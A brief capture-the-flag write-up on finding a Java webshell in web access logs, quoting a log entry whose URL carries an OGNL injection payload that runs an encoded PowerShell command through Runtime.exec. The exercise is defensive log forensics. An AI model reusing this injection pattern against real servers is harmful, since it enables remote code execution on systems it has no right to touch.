# Writeup

Question: Do you find the shell?

1. Think about the java webshell and grep the keyword.

```
212.30.60.161 - - [09/Mar/2016:10:20:10] "GET /login.do HTTP/1.1" 200 47ms 7126 - python-requests/2.27.1
212.30.60.161 - - [09/Mar/2016:10:20:20] "GET /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("powershell.exe -exec Bypass -noP -enco TU9DU0NURntqNHY0X3czYl81aDNsbF8yZmQwMTA3OTUyMzRkNTMzMDVlfQ==").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Response",#a))}/ HTTP/1.1" 302 595ms - - python-requests/2.27.1
```

> MOCSCTF{Java_web_shell}
